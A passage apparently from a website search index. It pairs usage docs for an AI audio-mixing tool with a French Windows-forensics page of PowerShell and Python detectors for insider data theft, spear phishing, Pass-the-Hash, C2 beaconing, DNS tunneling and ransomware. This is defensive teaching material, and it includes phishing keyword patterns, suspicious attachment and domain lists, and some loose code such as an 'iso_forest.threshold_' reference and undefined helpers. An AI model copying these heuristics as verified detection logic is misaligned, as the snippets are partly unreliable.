load_audio_files(\"data/batch_processing/\")\n\n# Process all files\nresults = {}\nfor filename, audio_data in audio_files.items():\n    actions, cuts = run_inference(\"models/trained_model.pkl\", {filename: audio_data})\n    results[filename] = {\"actions\": actions, \"cuts\": cuts}\n</code></pre>"},{"location":"usage/#interactive-mode","title":"Interactive Mode","text":"<p>Use the tool interactively to get real-time feedback:</p> <pre><code>from src.feedback import collect_user_feedback, save_feedback\n\n# Get AI suggestions\nactions, cuts = run_inference(model_path, audio_data)\n\n# Collect user feedback\nfeedback = collect_user_feedback(actions, cuts)\n\n# Save feedback for model improvement\nsave_feedback(feedback)\n</code></pre>"},{"location":"usage/#configuration","title":"Configuration","text":""},{"location":"usage/#environment-variables","title":"Environment Variables","text":"<p>Set these environment variables to customize behavior:</p> <pre><code>export MASTERAI_DATA_DIR=\"/path/to/your/data\"\nexport MASTERAI_MODEL_DIR=\"/path/to/your/models\"\nexport MASTERAI_OUTPUT_DIR=\"/path/to/output\"\n</code></pre>"},{"location":"usage/#model-parameters","title":"Model Parameters","text":"<p>Adjust model parameters in your code:</p> <pre><code># For ensemble model training\nmodel = train_model(\n    features, \n    labels,\n    n_estimators=200,  # Random Forest estimators\n    cnn_epochs=20,     # CNN training epochs\n    test_size=0.2      # Train/test split ratio\n)\n</code></pre>"},{"location":"usage/#output-format","title":"Output Format","text":""},{"location":"usage/#suggested-actions","title":"Suggested Actions","text":"<p>The AI outputs suggested actions in the following format:</p> <pre><code>{\n  \"track1.wav\": [\n    {\n      \"effect\": \"EQ\",\n      \"target\": \"vocals\",\n      \"level\": 0.8,\n      \"frequency\": \"high\"\n    },\n    {\n      \"effect\": \"Compression\",\n      \"target\": \"drums\",\n      \"level\": 0.6,\n      \"ratio\": \"4:1\"\n    }\n  ]\n}\n</code></pre>"},{"location":"usage/#suggested-cuts","title":"Suggested Cuts","text":"<p>Creative cuts and edits are suggested as:</p> <pre><code>{\n  \"track1.wav\": [\n    {\n      \"action\": \"Cut\",\n      \"location\": \"Chorus Start\",\n      \"description\": \"Introduce a glitch effect\",\n      \"timestamp\": \"0:45\"\n    },\n    {\n      \"action\": \"Slice\",\n      \"location\": \"Verse Mid\",\n      \"description\": \"Add a stutter effect\",\n      \"timestamp\": \"1:23\"\n    }\n  ]\n}\n</code></pre>"},{"location":"usage/#troubleshooting","title":"Troubleshooting","text":""},{"location":"usage/#common-issues","title":"Common Issues","text":"<p>1. Audio file not loading: <pre><code>Error: Could not load audio file\nSolution: Ensure the file is in WAV format and not corrupted\n</code></pre></p> <p>2. Model training fails: <pre><code>Error: Insufficient training data\nSolution: Ensure you have at least 10 audio files with metadata\n</code></pre></p> <p>3. Memory issues: <pre><code>Error: Out of memory during feature extraction\nSolution: Process files in smaller batches or reduce audio length\n</code></pre></p>"},{"location":"usage/#performance-tips","title":"Performance Tips","text":"<ol> <li>Use smaller audio segments (5-10 seconds) for faster processing</li> <li>Preprocess audio files to consistent sample rates (44.1kHz recommended)</li> <li>Use GPU acceleration for CNN model training (if available)</li> <li>Cache extracted features to avoid recomputation</li> </ol>"},{"location":"usage/#examples","title":"Examples","text":""},{"location":"usage/#example-1-basic-rap-track-processing","title":"Example 1: Basic Rap Track Processing","text":"<pre><code># Load a rap track\naudio_data, metadata = load_audio_files_with_metadata(\"data/rap_tracks/\")\n\n# Extract features\nfeatures = extract_basic_features(audio_data)\n\n# Get AI suggestions\nactions, cuts = run_inference(\"models/rap_model.pkl\", audio_data)\n\n# Print suggestions\nfor track, track_actions in actions.items():\n    print(f\"Track: {track}\")\n    for action in track_actions:\n        print(f\"  - Apply {action['effect']} to {action['target']} at level {action['level']}\")\n</code></pre>"},{"location":"usage/#example-2-custom-effect-analysis","title":"Example 2: Custom Effect Analysis","text":"<pre><code># Analyze specific effects in your tracks\nfrom src.feature_extraction import extract_mfcc\n\n# Extract detailed features\nmfcc_features = extract_mfcc(audio_data, n_mfcc=25)\n\n# Train a model specifically for effect recognition\neffect_model = train_model(mfcc_features, effect_labels)\n\n# Use the model to suggest similar effects\nsuggestions = effect_model.predict(new_track_features)\n</code></pre> <p>For more examples, check out the Jupyter notebooks in the <code>notebooks/</code> directory.</p>"},{"location":"use-cases/","title":"Cas d'Usage Sp\u00e9cifiques en Forensique Windows","text":""},{"location":"use-cases/#insider-threats-menaces-internes","title":"Insider Threats - Menaces internes","text":""},{"location":"use-cases/#vue-densemble-des-menaces-internes","title":"Vue d'ensemble des menaces internes","text":"<p>Les menaces internes repr\u00e9sentent l'un des d\u00e9fis les plus complexes en cybers\u00e9curit\u00e9, impliquant des individus ayant un acc\u00e8s l\u00e9gitime aux syst\u00e8mes d'une organisation.</p>"},{"location":"use-cases/#types-de-menaces-internes","title":"Types de menaces internes","text":"<p>Menaces malveillantes - Employ\u00e9s m\u00e9contents - Espionnage industriel - Sabotage informatique - Vol d'informations sensibles</p> <p>Menaces non-intentionnelles - N\u00e9gligence des employ\u00e9s - Erreurs de configuration - Violation involontaire de politiques - Compromission d'identifiants</p> <p>Menaces compromises - Comptes utilisateurs compromis - \u00c9l\u00e9vation de privil\u00e8ges - Mouvements lat\u00e9raux - Persistance avanc\u00e9e</p>"},{"location":"use-cases/#detection-dactivites-suspectes","title":"D\u00e9tection d'activit\u00e9s suspectes","text":""},{"location":"use-cases/#indicateurs-comportementaux","title":"Indicateurs comportementaux","text":"<p>Analyse des patterns d'acc\u00e8s <pre><code># Analyser les connexions hors heures normales\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4624} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $logonTime = $_.TimeCreated\n    $userName = ($eventData | Where-Object {$_.Name -eq \"TargetUserName\"}).'#text'\n    $logonType = ($eventData | Where-Object {$_.Name -eq \"LogonType\"}).'#text'\n    $sourceIP = ($eventData | Where-Object {$_.Name -eq \"IpAddress\"}).'#text'\n\n    # Identifier les connexions hors heures (weekends, nuits)\n    $isWeekend = $logonTime.DayOfWeek -in @([System.DayOfWeek]::Saturday, [System.DayOfWeek]::Sunday)\n    $isNight = $logonTime.Hour -lt 6 -or $logonTime.Hour -gt 22\n\n    if ($isWeekend -or $isNight) {\n        [PSCustomObject]@{\n            TimeCreated = $logonTime\n            UserName = $userName\n            LogonType = $logonType\n            SourceIP = $sourceIP\n            Anomaly = if ($isWeekend) { \"Weekend Access\" } else { \"Night Access\" }\n        }\n    }\n} | Where-Object {$_.UserName -ne \"SYSTEM\" -and $_.UserName -ne \"\"}\n</code></pre></p> <p>D\u00e9tection d'acc\u00e8s aux donn\u00e9es sensibles <pre><code># Monitoring des acc\u00e8s aux fichiers sensibles\nfunction Monitor-SensitiveFileAccess {\n    param(\n        [string[]]$SensitivePaths = @(\n            \"C:\\Sensitive\\\",\n            \"C:\\HR\\\",\n            \"C:\\Finance\\\",\n            \"C:\\Confidential\\\"\n        )\n    )\n\n    Get-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4663} | ForEach-Object {\n        $event = [xml]$_.ToXml()\n        $eventData = $event.Event.EventData.Data\n\n        $objectName = ($eventData | Where-Object {$_.Name -eq \"ObjectName\"}).'#text'\n        $subjectUser = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n        $accessMask = ($eventData | Where-Object {$_.Name -eq \"AccessMask\"}).'#text'\n        $processName = ($eventData | Where-Object {$_.Name -eq \"ProcessName\"}).'#text'\n\n        foreach ($path in $SensitivePaths) {\n            if ($objectName -like \"$path*\") {\n                [PSCustomObject]@{\n                    TimeCreated = $_.TimeCreated\n                    UserName = $subjectUser\n                    ObjectName = $objectName\n                    AccessMask = $accessMask\n                    ProcessName = $processName\n                    SensitiveArea = $path\n                }\n            }\n        }\n    }\n}\n</code></pre></p>"},{"location":"use-cases/#analyse-des-comportements-utilisateur","title":"Analyse des comportements utilisateur","text":"<p>Profiling des utilisateurs <pre><code>import pandas as pd\nfrom datetime import datetime, timedelta\nfrom sklearn.ensemble import IsolationForest\n\ndef create_user_behavior_profile(user_events):\n    \"\"\"\n    Cr\u00e9er un profil comportemental d'utilisateur\n    \"\"\"\n\n    # Convertir en DataFrame\n    df = pd.DataFrame(user_events)\n    df['timestamp'] = pd.to_datetime(df['timestamp'])\n\n    # Extraire les features comportementales\n    df['hour'] = df['timestamp'].dt.hour\n    df['day_of_week'] = df['timestamp'].dt.dayofweek\n    df['is_weekend'] = df['day_of_week'].isin([5, 6])\n\n    # Calculer les statistiques\n    profile = {\n        'user_id': df['user_id'].iloc[0],\n        'total_events': len(df),\n        'unique_machines': df['machine'].nunique(),\n        'unique_processes': df['process'].nunique(),\n        'avg_session_duration': df.groupby('session_id')['timestamp'].apply(\n            lambda x: (x.max() - x.min()).total_seconds()\n        ).mean(),\n        'common_hours': df['hour'].value_counts().head(3).index.tolist(),\n        'weekend_activity_ratio': df['is_weekend'].mean(),\n        'failed_logons': len(df[df['event_type'] == 'failed_logon']),\n        'file_access_count': len(df[df['event_type'] == 'file_access']),\n        'network_connections': len(df[df['event_type'] == 'network_connection'])\n    }\n\n    return profile\n\ndef detect_behavioral_anomalies(current_profile, historical_profiles):\n    \"\"\"\n    D\u00e9tecter les anomalies comportementales\n    \"\"\"\n\n    # Pr\u00e9parer les donn\u00e9es pour l'analyse\n    features = ['unique_machines', 'unique_processes', 'avg_session_duration',\n                'weekend_activity_ratio', 'failed_logons', 'file_access_count',\n                'network_connections']\n\n    # Cr\u00e9er la matrice de features\n    historical_data = []\n    for profile in historical_profiles:\n        historical_data.append([profile[feature] for feature in features])\n\n    current_data = [current_profile[feature] for feature in features]\n\n    # Utiliser Isolation Forest pour d\u00e9tecter les anomalies\n    iso_forest = IsolationForest(contamination=0.1, random_state=42)\n    iso_forest.fit(historical_data)\n\n    # Pr\u00e9dire si le comportement actuel est anormal\n    anomaly_score = iso_forest.decision_function([current_data])[0]\n    is_anomaly = iso_forest.predict([current_data])[0] == -1\n\n    return {\n        'is_anomaly': is_anomaly,\n        'anomaly_score': anomaly_score,\n        'threshold': iso_forest.threshold_\n    }\n</code></pre></p>"},{"location":"use-cases/#correlation-multi-sources","title":"Corr\u00e9lation multi-sources","text":""},{"location":"use-cases/#integration-des-donnees","title":"Int\u00e9gration des donn\u00e9es","text":"<p>Corr\u00e9lation Active Directory et fichiers <pre><code>function Correlate-ADAndFileAccess {\n    param(\n        [datetime]$StartTime,\n        [datetime]$EndTime,\n        [string]$TargetUser\n    )\n\n    # R\u00e9cup\u00e9rer les \u00e9v\u00e9nements AD\n    $adEvents = Get-WinEvent -FilterHashtable @{\n        LogName=\"Security\"\n        Id=4624,4625,4768,4769,4770\n        StartTime=$StartTime\n        EndTime=$EndTime\n    } | Where-Object {\n        $event = [xml]$_.ToXml()\n        $userName = ($event.Event.EventData.Data | Where-Object {$_.Name -eq \"TargetUserName\"}).'#text'\n        $userName -eq $TargetUser\n    }\n\n    # R\u00e9cup\u00e9rer les acc\u00e8s fichiers\n    $fileEvents = Get-WinEvent -FilterHashtable @{\n        LogName=\"Security\"\n        Id=4656,4658,4663\n        StartTime=$StartTime\n        EndTime=$EndTime\n    } | Where-Object {\n        $event = [xml]$_.ToXml()\n        $userName = ($event.Event.EventData.Data | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n        $userName -eq $TargetUser\n    }\n\n    # R\u00e9cup\u00e9rer les \u00e9v\u00e9nements Sysmon\n    $sysmonEvents = Get-WinEvent -FilterHashtable @{\n        LogName=\"Microsoft-Windows-Sysmon/Operational\"\n        Id=1,3,11\n        StartTime=$StartTime\n        EndTime=$EndTime\n    } | Where-Object {\n        $event = [xml]$_.ToXml()\n        $userName = ($event.Event.EventData.Data | Where-Object {$_.Name -eq \"User\"}).'#text'\n        $userName -like \"*$TargetUser*\"\n    }\n\n    # Corr\u00e9ler les \u00e9v\u00e9nements\n    $correlatedEvents = @()\n\n    foreach ($adEvent in $adEvents) {\n        $adTime = $adEvent.TimeCreated\n\n        # Trouver les \u00e9v\u00e9nements fichiers dans une fen\u00eatre de 5 minutes\n        $relatedFileEvents = $fileEvents | Where-Object {\n            $timeDiff = [math]::Abs(($_.TimeCreated - $adTime).TotalMinutes)\n            $timeDiff -le 5\n        }\n\n        # Trouver les \u00e9v\u00e9nements Sysmon dans une fen\u00eatre de 5 minutes\n        $relatedSysmonEvents = $sysmonEvents | Where-Object {\n            $timeDiff = [math]::Abs(($_.TimeCreated - $adTime).TotalMinutes)\n            $timeDiff -le 5\n        }\n\n        if ($relatedFileEvents -or $relatedSysmonEvents) {\n            $correlatedEvents += [PSCustomObject]@{\n                ADEvent = $adEvent\n                RelatedFileEvents = $relatedFileEvents\n                RelatedSysmonEvents = $relatedSysmonEvents\n                TimeWindow = $adTime\n            }\n        }\n    }\n\n    return $correlatedEvents\n}\n</code></pre></p>"},{"location":"use-cases/#cas-detudes-pratiques","title":"Cas d'\u00e9tudes pratiques","text":""},{"location":"use-cases/#cas-detude-1-vol-de-donnees-par-employe","title":"Cas d'\u00e9tude 1: Vol de donn\u00e9es par employ\u00e9","text":"<p>Sc\u00e9nario Un employ\u00e9 du d\u00e9partement IT t\u00e9l\u00e9charge massivement des fichiers confidentiels avant son d\u00e9part.</p> <p>Analyse forensique <pre><code># 1. Analyser les acc\u00e8s aux fichiers sensibles\n$suspiciousFileAccess = Get-WinEvent -FilterHashtable @{\n    LogName=\"Security\"\n    Id=4663\n    StartTime=(Get-Date).AddDays(-30)\n} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $objectName = ($eventData | Where-Object {$_.Name -eq \"ObjectName\"}).'#text'\n    $subjectUser = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n\n    if ($objectName -like \"*Confidential*\" -or $objectName -like \"*HR*\") {\n        [PSCustomObject]@{\n            TimeCreated = $_.TimeCreated\n            UserName = $subjectUser\n            FileName = $objectName\n            Action = \"File Access\"\n        }\n    }\n} | Group-Object UserName | Sort-Object Count -Descending\n\n# 2. Analyser les t\u00e9l\u00e9chargements\n$downloadEvents = Get-WinEvent -FilterHashtable @{\n    LogName=\"Microsoft-Windows-Sysmon/Operational\"\n    Id=11\n    StartTime=(Get-Date).AddDays(-30)\n} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $targetFilename = ($eventData | Where-Object {$_.Name -eq \"TargetFilename\"}).'#text'\n    $user = ($eventData | Where-Object {$_.Name -eq \"User\"}).'#text'\n\n    if ($targetFilename -like \"*Downloads*\" -or $targetFilename -like \"*USB*\") {\n        [PSCustomObject]@{\n            TimeCreated = $_.TimeCreated\n            UserName = $user\n            FileName = $targetFilename\n            Action = \"File Creation\"\n        }\n    }\n}\n\n# 3. Corr\u00e9ler avec les connexions USB\n$usbEvents = Get-WinEvent -FilterHashtable @{\n    LogName=\"System\"\n    Id=20001,20003\n    StartTime=(Get-Date).AddDays(-30)\n}\n</code></pre></p>"},{"location":"use-cases/#cas-detude-2-sabotage-systeme","title":"Cas d'\u00e9tude 2: Sabotage syst\u00e8me","text":"<p>Sc\u00e9nario Un administrateur syst\u00e8me supprime des fichiers critiques et modifie des configurations.</p> <p>Analyse forensique <pre><code># 1. Analyser les suppressions de fichiers\n$deletionEvents = Get-WinEvent -FilterHashtable @{\n    LogName=\"Security\"\n    Id=4660,4663\n    StartTime=(Get-Date).AddDays(-7)\n} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $objectName = ($eventData | Where-Object {$_.Name -eq \"ObjectName\"}).'#text'\n    $subjectUser = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n    $accessMask = ($eventData | Where-Object {$_.Name -eq \"AccessMask\"}).'#text'\n\n    # AccessMask 0x10000 = DELETE\n    if ($accessMask -eq \"0x10000\") {\n        [PSCustomObject]@{\n            TimeCreated = $_.TimeCreated\n            UserName = $subjectUser\n            ObjectName = $objectName\n            Action = \"File Deletion\"\n        }\n    }\n}\n\n# 2. Analyser les modifications de registre\n$registryEvents = Get-WinEvent -FilterHashtable @{\n    LogName=\"Security\"\n    Id=4657\n    StartTime=(Get-Date).AddDays(-7)\n} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $objectName = ($eventData | Where-Object {$_.Name -eq \"ObjectName\"}).'#text'\n    $subjectUser = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n\n    if ($objectName -like \"*Services*\" -or $objectName -like \"*Policies*\") {\n        [PSCustomObject]@{\n            TimeCreated = $_.TimeCreated\n            UserName = $subjectUser\n            RegistryKey = $objectName\n            Action = \"Registry Modification\"\n        }\n    }\n}\n</code></pre></p>"},{"location":"use-cases/#apt-detection-menaces-persistantes-avancees","title":"APT Detection - Menaces persistantes avanc\u00e9es","text":""},{"location":"use-cases/#vue-densemble-des-apt","title":"Vue d'ensemble des APT","text":"<p>Les Advanced Persistent Threats (APT) sont des campagnes d'attaque sophistiqu\u00e9es et persistantes, g\u00e9n\u00e9ralement men\u00e9es par des acteurs \u00e9tatiques ou des groupes criminels organis\u00e9s.</p>"},{"location":"use-cases/#caracteristiques-des-apt","title":"Caract\u00e9ristiques des APT","text":"<p>Sophistication technique - Outils personnalis\u00e9s - Techniques d'\u00e9vasion avanc\u00e9es - Exploitation de zero-days - Chiffrement des communications</p> <p>Persistance - Pr\u00e9sence \u00e0 long terme - Multiples m\u00e9canismes de persistance - Redondance des acc\u00e8s - Capacit\u00e9 de r\u00e9cup\u00e9ration</p> <p>Discr\u00e9tion - Activit\u00e9 minimale - Camouflage dans le trafic l\u00e9gitime - Suppression des traces - Techniques anti-forensiques</p>"},{"location":"use-cases/#techniques-dapt","title":"Techniques d'APT","text":""},{"location":"use-cases/#vecteurs-dattaque-courants","title":"Vecteurs d'attaque courants","text":"<p>Spear Phishing <pre><code># D\u00e9tection d'emails de spear phishing\nfunction Detect-SpearPhishing {\n    param([string]$MailboxPath)\n\n    # Analyser les emails avec pi\u00e8ces jointes suspectes\n    $suspiciousEmails = Get-ChildItem -Path $MailboxPath -Recurse -Include \"*.eml\" | ForEach-Object {\n        $email = Get-Content $_.FullName -Raw\n\n        # Indicateurs de spear phishing\n        $indicators = @(\n            \"urgent.*action.*required\",\n            \"click.*here.*immediately\",\n            \"verify.*account.*information\",\n            \"suspended.*account\",\n            \"unusual.*activity\"\n        )\n\n        $attachmentTypes = @(\"\\.exe\", \"\\.scr\", \"\\.bat\", \"\\.vbs\", \"\\.js\")\n\n        $suspiciousIndicators = $indicators | Where-Object { $email -match $_ }\n        $suspiciousAttachments = $attachmentTypes | Where-Object { $email -match $_ }\n\n        if ($suspiciousIndicators -or $suspiciousAttachments) {\n            [PSCustomObject]@{\n                FilePath = $_.FullName\n                SuspiciousIndicators = $suspiciousIndicators\n                SuspiciousAttachments = $suspiciousAttachments\n                Email = $email\n            }\n        }\n    }\n\n    return $suspiciousEmails\n}\n</code></pre></p> <p>Watering Hole Attacks <pre><code># Analyser l'historique de navigation pour d\u00e9tecter les watering holes\nfunction Detect-WateringHole {\n    param([string]$BrowserHistoryPath)\n\n    # Domaines suspects connus\n    $suspiciousDomains = @(\n        \"suspicious-domain.com\",\n        \"fake-news-site.org\",\n        \"malicious-update.net\"\n    )\n\n    # Analyser l'historique Chrome\n    $chromeHistory = Invoke-SqliteQuery -DataSource \"$BrowserHistoryPath\\History\" -Query \"\n        SELECT url, title, visit_count, last_visit_time \n        FROM urls \n        WHERE last_visit_time &gt; datetime('now', '-30 days')\n    \"\n\n    $suspiciousVisits = $chromeHistory | Where-Object {\n        $url = $_.url\n        $suspiciousDomains | Where-Object { $url -like \"*$_*\" }\n    }\n\n    return $suspiciousVisits\n}\n</code></pre></p>"},{"location":"use-cases/#techniques-de-mouvement-lateral","title":"Techniques de mouvement lat\u00e9ral","text":"<p>Pass-the-Hash Detection <pre><code># D\u00e9tecter les attaques Pass-the-Hash\nfunction Detect-PassTheHash {\n    param(\n        [datetime]$StartTime = (Get-Date).AddDays(-1),\n        [datetime]$EndTime = (Get-Date)\n    )\n\n    # \u00c9v\u00e9nements de logon Type 3 (Network) avec NTLM\n    $networkLogons = Get-WinEvent -FilterHashtable @{\n        LogName=\"Security\"\n        Id=4624\n        StartTime=$StartTime\n        EndTime=$EndTime\n    } | ForEach-Object {\n        $event = [xml]$_.ToXml()\n        $eventData = $event.Event.EventData.Data\n\n        $logonType = ($eventData | Where-Object {$_.Name -eq \"LogonType\"}).'#text'\n        $authPackage = ($eventData | Where-Object {$_.Name -eq \"AuthenticationPackageName\"}).'#text'\n        $targetUser = ($eventData | Where-Object {$_.Name -eq \"TargetUserName\"}).'#text'\n        $sourceIP = ($eventData | Where-Object {$_.Name -eq \"IpAddress\"}).'#text'\n        $logonProcess = ($eventData | Where-Object {$_.Name -eq \"LogonProcessName\"}).'#text'\n\n        if ($logonType -eq \"3\" -and $authPackage -eq \"NTLM\") {\n            [PSCustomObject]@{\n                TimeCreated = $_.TimeCreated\n                TargetUser = $targetUser\n                SourceIP = $sourceIP\n                LogonProcess = $logonProcess\n                AuthPackage = $authPackage\n                LogonType = $logonType\n            }\n        }\n    }\n\n    # Identifier les patterns suspects\n    $suspiciousLogons = $networkLogons | Group-Object TargetUser | Where-Object {\n        $_.Count -gt 10  # Nombreuses connexions\n    } | ForEach-Object {\n        $userLogons = $_.Group\n        $uniqueIPs = $userLogons | Group-Object SourceIP\n\n        if ($uniqueIPs.Count -gt 5) {  # Depuis plusieurs IPs\n            [PSCustomObject]@{\n                UserName = $_.Name\n                LogonCount = $_.Count\n                UniqueIPs = $uniqueIPs.Count\n                FirstLogon = ($userLogons | Sort-Object TimeCreated)[0].TimeCreated\n                LastLogon = ($userLogons | Sort-Object TimeCreated)[-1].TimeCreated\n                SourceIPs = $uniqueIPs.Name\n            }\n        }\n    }\n\n    return $suspiciousLogons\n}\n</code></pre></p>"},{"location":"use-cases/#detection-dactivites-apt","title":"D\u00e9tection d'activit\u00e9s APT","text":""},{"location":"use-cases/#analyse-des-communications-c2","title":"Analyse des communications C2","text":"<p>D\u00e9tection de beaconing <pre><code>import pandas as pd\nimport numpy as np\nfrom collections import defaultdict\n\ndef detect_c2_beaconing(network_logs):\n    \"\"\"\n    D\u00e9tecter les communications de beaconing C2\n    \"\"\"\n\n    # Analyser les connexions par destination\n    connections = defaultdict(list)\n\n    for log in network_logs:\n        key = f\"{log['src_ip']}-&gt;{log['dst_ip']}:{log['dst_port']}\"\n        connections[key].append(log['timestamp'])\n\n    beacons = []\n\n    for connection, timestamps in connections.items():\n        if len(timestamps) &lt; 10:  # Minimum 10 connexions\n            continue\n\n        # Calculer les intervalles\n        timestamps.sort()\n        intervals = []\n\n        for i in range(1, len(timestamps)):\n            interval = (timestamps[i] - timestamps[i-1]).total_seconds()\n            intervals.append(interval)\n\n        if len(intervals) &lt; 5:\n            continue\n\n        # Analyser la r\u00e9gularit\u00e9\n        mean_interval = np.mean(intervals)\n        std_interval = np.std(intervals)\n        cv = std_interval / mean_interval if mean_interval &gt; 0 else 0\n\n        # Coefficient de variation faible = beaconing\n        if cv &lt; 0.3 and mean_interval &gt; 60:  # CV &lt; 30% et intervalle &gt; 1min\n            beacons.append({\n                'connection': connection,\n                'count': len(timestamps),\n                'mean_interval': mean_interval,\n                'std_interval': std_interval,\n                'cv': cv,\n                'first_seen': timestamps[0],\n                'last_seen': timestamps[-1]\n            })\n\n    return beacons\n</code></pre></p> <p>D\u00e9tection de DNS tunneling <pre><code>def detect_dns_tunneling(dns_logs):\n    \"\"\"\n    D\u00e9tecter le tunneling DNS\n    \"\"\"\n\n    suspicious_domains = []\n\n    # Analyser les requ\u00eates DNS\n    for log in dns_logs:\n        domain = log['query_name']\n\n        # Indicateurs de tunneling\n        indicators = {\n            'long_subdomain': len(domain.split('.')[0]) &gt; 50,\n            'high_entropy': calculate_entropy(domain) &gt; 4.5,\n            'unusual_tld': domain.split('.')[-1] in ['tk', 'ml', 'ga', 'cf'],\n            'base64_like': is_base64_like(domain.split('.')[0]),\n            'hex_like': is_hex_like(domain.split('.')[0])\n        }\n\n        suspicion_score = sum(indicators.values())\n\n        if suspicion_score &gt;= 2:\n            suspicious_domains.append({\n                'domain': domain,\n                'timestamp': log['timestamp'],\n                'client_ip': log['client_ip'],\n                'indicators': indicators,\n                'suspicion_score': suspicion_score\n            })\n\n    return suspicious_domains\n\ndef calculate_entropy(string):\n    \"\"\"Calculer l'entropie d'une cha\u00eene\"\"\"\n    import math\n    from collections import Counter\n\n    counter = Counter(string)\n    length = len(string)\n    entropy = 0\n\n    for count in counter.values():\n        p = count / length\n        entropy -= p * math.log2(p)\n\n    return entropy\n</code></pre></p>"},{"location":"use-cases/#analyse-de-campagnes","title":"Analyse de campagnes","text":""},{"location":"use-cases/#attribution-et-profiling","title":"Attribution et profiling","text":"<p>Analyse des TTPs (Tactics, Techniques, Procedures) <pre><code>def analyze_apt_ttps(incident_data):\n    \"\"\"\n    Analyser les TTPs d'un incident APT\n    \"\"\"\n\n    # Mapping MITRE ATT&amp;CK\n    mitre_mapping = {\n        'T1566': 'Phishing',\n        'T1078': 'Valid Accounts',\n        'T1055': 'Process Injection',\n        'T1068': 'Exploitation for Privilege Escalation',\n        'T1012': 'Query Registry',\n        'T1083': 'File and Directory Discovery',\n        'T1057': 'Process Discovery',\n        'T1018': 'Remote System Discovery',\n        'T1021': 'Remote Services',\n        'T1105': 'Ingress Tool Transfer',\n        'T1041': 'Exfiltration Over C2 Channel',\n        'T1027': 'Obfuscated Files or Information'\n    }\n\n    detected_ttps = []\n\n    for evidence in incident_data:\n        # Analyser les artefacts pour identifier les TTPs\n        if 'email' in evidence['type']:\n            if any(indicator in evidence['content'] for indicator in ['urgent', 'click here', 'verify']):\n                detected_ttps.append('T1566')\n\n        if 'process' in evidence['type']:\n            if any(technique in evidence['command_line'] for technique in ['powershell', 'rundll32', 'regsvr32']):\n                detected_ttps.append('T1055')\n\n        if 'registry' in evidence['type']:\n            detected_ttps.append('T1012')\n\n        if 'network' in evidence['type']:\n            if evidence['protocol'] == 'DNS' and len(evidence['query']) &gt; 50:\n                detected_ttps.append('T1041')\n\n    # Cr\u00e9er le profil TTP\n    ttp_profile = {\n        'detected_ttps': list(set(detected_ttps)),\n        'ttp_descriptions': {ttp: mitre_mapping.get(ttp, 'Unknown') for ttp in detected_ttps},\n        'attack_phases': categorize_attack_phases(detected_ttps),\n        'sophistication_score': calculate_sophistication_score(detected_ttps)\n    }\n\n    return ttp_profile\n</code></pre></p>"},{"location":"use-cases/#ransomware-analysis-analyse-de-rancongiciels","title":"Ransomware Analysis - Analyse de ran\u00e7ongiciels","text":""},{"location":"use-cases/#vue-densemble-des-ransomwares","title":"Vue d'ensemble des ransomwares","text":"<p>Les ransomwares repr\u00e9sentent une menace majeure, chiffrant les donn\u00e9es des victimes et exigeant une ran\u00e7on pour leur r\u00e9cup\u00e9ration.</p>"},{"location":"use-cases/#types-de-ransomware","title":"Types de ransomware","text":"<p>Crypto-ransomware - Chiffrement des fichiers utilisateur - Demande de ran\u00e7on en cryptocurrency - Exemples: WannaCry, Ryuk, Conti</p> <p>Locker-ransomware - Verrouillage de l'interface utilisateur - Blocage de l'acc\u00e8s au syst\u00e8me - Moins courant actuellement</p> <p>Ransomware-as-a-Service (RaaS) - Mod\u00e8le \u00e9conomique organis\u00e9 - Affiliation et partage des profits - Exemples: Sodinokibi, DarkSide</p>"},{"location":"use-cases/#detection-precoce","title":"D\u00e9tection pr\u00e9coce","text":""},{"location":"use-cases/#surveillance-des-comportements-suspects","title":"Surveillance des comportements suspects","text":"<p>D\u00e9tection d'activit\u00e9 de chiffrement <pre><code># Surveiller les modifications massives de fichiers\nfunction Monitor-FileEncryption {\n    param([string[]]$MonitoredPaths)\n\n    # Cr\u00e9er un FileSystemWatcher pour chaque chemin\n    $watchers = @()\n\n    foreach ($path in $MonitoredPaths) {\n        $watcher = New-Object System.IO.FileSystemWatcher\n        $watcher.Path = $path\n        $watcher.Filter = \"*.*\"\n        $watcher.IncludeSubdirectories = $true\n        $watcher.EnableRaisingEvents = $true\n\n        # \u00c9v\u00e9nements \u00e0 surveiller\n        $watcher.NotifyFilter = [System.IO.NotifyFilters]::LastWrite -bor [System.IO.NotifyFilters]::FileName\n\n        # Variables pour d\u00e9tecter l'activit\u00e9 massive\n        $script:fileChanges = @()\n        $script:alertThreshold = 100  # 100 fichiers en 60 secondes\n\n        Register-ObjectEvent -InputObject $watcher -EventName \"Changed\" -Action {\n            $script:fileChanges += @{\n                Path = $Event.SourceEventArgs.FullPath\n                Timestamp = Get-Date\n                Action = \"Modified\"\n            }\n\n            # Nettoyer les \u00e9v\u00e9nements anciens (&gt; 60 secondes)\n            $cutoffTime = (Get-Date).AddSeconds(-60)\n            $script:fileChanges = $script:fileChanges | Where-Object { $_.Timestamp -gt $cutoffTime }\n\n            # V\u00e9rifier le seuil d'alerte\n            if ($script:fileChanges.Count -ge $script:alertThreshold) {\n                Write-Warning \"RANSOMWARE ALERT: $($script:fileChanges.Count) file changes detected in 60 seconds\"\n\n                # Analyser les extensions\n                $extensions = $script:fileChanges | ForEach-Object { \n                    [System.IO.Path]::GetExtension($_.Path) \n                } | Group-Object | Sort-Object Count -Descending\n\n                Write-Host \"Most common extensions:\"\n                $extensions | Select-Object -First 5 | ForEach-Object {\n                    Write-Host \"  $($_.Name): $($_.Count) files\"\n                }\n            }\n        }\n\n        $watchers += $watcher\n    }\n\n    return $watchers\n}\n</code></pre></p> <p>D\u00e9tection d'extensions de fichiers malveillantes <pre><code># D\u00e9tecter les extensions de ransomware connues\nfunction Detect-RansomwareExtensions 